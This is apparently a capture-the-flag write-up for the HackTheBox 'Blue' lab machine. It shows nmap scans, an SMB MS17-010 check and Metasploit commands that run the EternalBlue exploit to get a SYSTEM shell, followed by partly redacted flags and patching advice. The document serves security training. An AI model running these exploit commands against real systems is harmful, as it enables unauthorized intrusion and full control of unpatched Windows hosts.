---
layout: single
title: "HackTheBox — Blue (CTF Write-up)"
excerpt: "Step-by-step exploitation of the Blue machine on HackTheBox using EternalBlue (MS17-010) with Metasploit."
date: 2024-05-10
type: ctf
featured: false
author_profile: false
tags:
  - HackTheBox
  - Metasploit
  - EternalBlue
  - Windows
  - CTF
header:
  teaser: /assets/images/projects/htb-blue.png
---

## Machine Info

| Field | Value |
|-------|-------|
| Platform | HackTheBox |
| OS | Windows 7 |
| Difficulty | Easy |
| IP | 10.10.10.40 |

> **Note:** Spoiler alert — full walk-through below.

## Enumeration

### Nmap scan

```bash
nmap -sV -sC -p- 10.10.10.40 -oN blue.nmap
```

**Key findings:**

```
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds  Windows 7 Professional SP1
```

SMB is open on port 445. Time to check for known vulnerabilities.

### Vulnerability scan

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40
```

Output confirmed the machine is vulnerable to **MS17-010 (EternalBlue)**.

## Exploitation

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.X
run
```

Got a SYSTEM shell immediately — no privilege escalation needed.

## Flags

```bash
# User flag
C:\Users\haris\Desktop> type user.txt
4c546xxx...

# Root flag
C:\Users\Administrator\Desktop> type root.txt
ff548xxx...
```

## Key Takeaways

- EternalBlue is a critical unpatched SMB vulnerability — always patch Windows systems
- Running Nmap vuln scripts early saves time
- Metasploit makes exploitation straightforward, but understanding the underlying CVE matters more

## References

- [MS17-010 — Microsoft Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
